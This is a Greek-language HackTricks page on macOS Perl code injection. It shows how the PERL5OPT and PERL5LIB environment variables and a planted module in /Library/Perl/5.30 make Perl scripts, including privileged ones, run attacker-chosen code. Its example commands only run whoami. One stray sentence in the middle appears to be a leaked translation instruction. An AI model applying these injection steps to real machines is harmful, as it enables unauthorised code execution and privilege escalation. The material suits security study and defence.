# macOS Εισαγωγή σε Εφαρμογές Perl

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Μέσω των μεταβλητών περιβάλλοντος `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατόν να κάνετε το perl να εκτελέσει αυθαίρετες εντολές.\
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **script perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές περιβάλλοντος:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Μέσω εξαρτήσεων

Είναι δυνατόν να καταχωρηθεί η σειρά φακέλων εξαρτήσεων του Perl που εκτελείται:
```bash
perl -e 'print join("\n", @INC)'
```
Το παρακάτω είναι περιεχόμενο από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το παρακάτω περιεχόμενο είναι από το αρχείο macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md.
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Μερικοί από τους φακέλους που επιστράφηκαν δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν προστατεύεται από το **SIP** και βρίσκεται πριν από τους φακέλους που προστατεύονται από το SIP. Συνεπώς, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε scripts ώστε ένα Perl script υψηλής προνομιακής πρόσβασης να τις φορτώσει.

{% hint style="warning" %}
Ωστόσο, σημειώστε ότι **χρειάζεστε root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτό το **TCC prompt**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Για παράδειγμα, αν ένα script εισάγει **`use File::Basename;`** θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελέσει αυθαίρετο κώδικα.

## Αναφορές

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
